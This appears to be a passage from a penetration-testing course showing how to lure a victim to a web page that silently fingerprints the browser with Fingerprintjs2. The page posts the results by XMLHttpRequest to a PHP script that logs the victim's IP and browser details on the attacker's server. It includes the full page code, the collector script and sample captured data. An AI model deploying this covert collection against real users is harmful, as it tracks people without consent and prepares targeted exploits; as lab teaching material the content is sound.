The process of client fingerprinting is extremely critical to the success of our attack, but to obtain the most precise information, we must often gather it from the target machine itself. We can perform this important phase of the attack as a standalone step before the exploitation process or incorporate fingerprinting into the first stage of the exploit itself.

Let's assume we have convinced our victim to visit our malicious web page in a practical example. Our goal will be to identify the victim's web browser version and information about the underlying operating system.

Web browsers are generally a good vector for collecting information on the target. Their evolution, complexity, and richness in functionality has become a double-edged sword for both end users and attackers.

We could create our own custom tool but there are many available open-source fingerprinting projects, and the most reliable ones are generally those that directly leverage common client-side components such as JavaScript.

For this example, we will use the Fingerprintjs2 JavaScript library,2 which can be installed by downloading and extracting the project archive from its GitHub repository:

kali@kali:/var/www/html$ sudo wget https://github.com/Valve/fingerprintjs2/archive/master.zip
--2019-07-24 02:42:36--  https://github.com/Valve/fingerprintjs2/archive/master.zip
...  

2019-07-24 02:42:41 (116 KB/s) - ‘master.zip’ saved [99698]

kali@kali:/var/www/html$ sudo unzip master.zip 
Archive:  master.zip
eb44f8f6f5a8c4c0ae476d4c60d8ed1015b2b605
   creating: fingerprintjs2-master/
  inflating: fingerprintjs2-master/.eslintrc  
...
kali@kali:/var/www/html$ sudo mv fingerprintjs2-master/ fp

    Listing 1 - Downloading the Fingerprintjs2 library

We can incorporate this library into an HTML file based on the examples included with the project. We will include the fingerprint2.js library from within the index.html HTML file located in the /var/www/html/fp directory of our Kali web server:

kali@kali:/var/www/html/fp$ cat index.html 
<!doctype html>
<html>
<head>
  <title>Fingerprintjs2 test</title>
</head>
<body>
  <h1>Fingerprintjs2</h1>

  <p>Your browser fingerprint: <strong id="fp"></strong></p>
  <p><code id="time"/></p>
  <p><span id="details"/></p>
  <script src="fingerprint2.js"></script>
  <script>
      var d1 = new Date();
      var options = {};
      Fingerprint2.get(options, function (components) {
        var values = components.map(function (component) { return component.value })
        var murmur = Fingerprint2.x64hash128(values.join(''), 31)
        var d2 = new Date();
        var timeString = "Time to calculate the fingerprint: " + (d2 - d1) + "ms";
        var details = "<strong>Detailed information: </strong><br />";
        if(typeof window.console !== "undefined") {
          for (var index in components) {
            var obj = components[index];
            var value = obj.value;
	          if (value !== null) {
              var line = obj.key + " = " + value.toString().substr(0, 150);
              details += line + "<br />";
	          }
          }
        }
        document.querySelector("#details").innerHTML = details 
        document.querySelector("#fp").textContent = murmur 
        document.querySelector("#time").textContent = timeString
      });
  </script>
</body>
</html>

    Listing 2 - Using the Fingerprintjs2 JavaScript library

The JavaScript code in Listing 2 invokes the Fingerprint2.get static function to start the fingerprinting process. The components variable returned by the library is an array containing all the information extracted from the client. The values stored in the components array are passed to the murmur3 hash function in order to create a hash fingerprint of the browser. Finally, the same values are extracted and displayed in the HTML page.

The below web page (Figure 2) from our Windows lab machine reveals that a few lines of JavaScript code extracted the browser User Agent string, its localization, the installed browser plugins and relative version, generic information regarding the underlying Win32 operating system platform, and other details:

Figure 2: Fingerprinting a browser through the JavaScript Fingerprintjs2 library
Figure 2: Fingerprinting a browser through the JavaScript Fingerprintjs2 library

Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537 Edge/16.16299

    Listing 3 - The complete User Agent string extracted by the JavaScript script

We can submit this User Agent string to an online user agent database to identify the browser version and operating system as shown in Figure 3.

Figure 3: Identifying the exact browser version through the http://developers.whatismybrowser.com user agent database
Figure 3: Identifying the exact browser version through the http://developers.whatismybrowser.com user agent database

Notice that the User Agent string implicitly tells us that Microsoft Edge 41 is running on the 32-bit version of Windows 10. For 64-bit versions of Windows, the string would have otherwise contained some information regarding the 64-bit architecture as shown below:

Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537 Edge/16.16299

    Listing 4 - The complete User Agent string for the same version of Microsoft Edge on a 64-bit version of Windows

We managed to gather the information we were after, but the JavaScript code from Listing 2 displays data to the victim rather than to the attacker. This is obviously not very useful so we need to find a way to transfer the extracted information to our attacking web server.

A few lines of Ajax4 code should do the trick. Listing 5 shows a modified version of the previously used fingerprint web page. In this code, we use the XMLHttpRequest JavaScript API to interact with the attacking web server via a POST request. The POST request is issued against the same server where the malicious web page is stored, therefore the URL used in the xmlhttp.open method does not specify an IP address.

The components array, which contains the information extracted by the Fingerprint2 library, is processed by a few lines of JavaScript code, similar to the previous example. This time, however, the result output string is sent to js.php via a POST request. The key components are highlighted in Listing 5 below:

<!doctype html>
<html>
<head>
  <title>Blank Page</title>
</head>
<body>
  <h1>You have been given the finger!</h1>
  <script src="fingerprint2.js"></script>
  <script>
      var d1 = new Date();
      var options = {};
      Fingerprint2.get(options, function (components) {
        var values = components.map(function (component) { return component.value })
        var murmur = Fingerprint2.x64hash128(values.join(''), 31)
	      var clientfp = "Client browser fingerprint: " + murmur + "\n\n";
        var d2 = new Date();
        var timeString = "Time to calculate fingerprint: " + (d2 - d1) + "ms\n\n";
        var details = "Detailed information: \n";
        if(typeof window.console !== "undefined") {
          for (var index in components) {
            var obj = components[index];
            var value = obj.value;
	          if (value !== null) {
              var line = obj.key + " = " + value.toString().substr(0, 150);
              details += line + "\n";
	          }
          }
        }
        var xmlhttp = new XMLHttpRequest();
        xmlhttp.open("POST", "/fp/js.php");
        xmlhttp.setRequestHeader("Content-Type", "application/txt");
        xmlhttp.send(clientfp + timeString + details);
      });
  </script>
</body>
</html>

    Listing 5 - Sending browser information to the attacker server

Let's look at the /fp/js.php PHP code that processes the POST request on the attacking server:

```php
<?php
$data = "Client IP Address: " . $_SERVER['REMOTE_ADDR'] . "\n";
$data .= file_get_contents('php://input');
$data .= "---------------------------------\n\n";
file_put_contents('/var/www/html/fp/fingerprint.txt', print_r($data, true), FILE_APPEND | LOCK_EX);
?>
```

The PHP code first extracts the client IP address from the $_SERVER5 array, which contains server and execution environment information. Then the IP address is concatenated to the text string received from the JavaScript POST request and written to the fingerprint.txt file in the /var/www/html/fp/ directory. Notice the use of the FILE_APPEND flag, which allows us to store multiple fingerprints to the same file.

In order for this code to work, we need to allow the Apache www-data user to write to the fp directory:

kali@kali:/var/www/html$ sudo chown www-data:www-data fp

    Listing 7 - Changing permissions on the fp directory

Once the victim browses the fingerprint2server.html web page (Figure 4), we can inspect the contents of fingerprint.txt on our attack server:

Client IP Address: 10.11.0.22
Client browser fingerprint: ff0435cc84bcac49b15078773c5e3f2e

Time took to calculate the fingerprint: 625ms

Detailed information: 
userAgent = Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 Edge/16.16299
webdriver = false
language = en-US
colorDepth = 24
deviceMemory = not available
hardwareConcurrency = 1
screenResolution = 787,1260
availableScreenResolution = 747,1260
timezoneOffset = 420
timezone = America/Los_Angeles
sessionStorage = true
localStorage = true
indexedDb = true
addBehavior = false
openDatabase = false
cpuClass = not available
platform = Win32
plugins = Edge PDF Viewer,Portable Document Format,application/pdf,pdf
canvas = canvas winding:yes,canvas fp:data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAB9
webgl = data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAACWCAYAAABkW7XSAAAAAXNSR0IA
webglVendorAndRenderer = Microsoft~Microsoft Basic Render Driver
adBlock = false
hasLiedLanguages = false
hasLiedResolution = false
hasLiedOs = false
hasLiedBrowser = false
touchSupport = 0,false,false
fonts = Arial,Arial Black,Arial Narrow,Arial Rounded MT Bold,Book Antiqua,Bookman Old
audio = 124.08073878219147

    Listing 8 - The browser fingerprint information sent to the server

With this modification, no information will be displayed in the victim's browser. The XMLHttpRequest silently transferred the data to our attack server without any interaction from the victim. The only output seen by the victim is our chosen text:

Figure 4: Browser Fingerprinting through a XMLHttpRequest request
Figure 4: Browser Fingerprinting through a XMLHttpRequest request
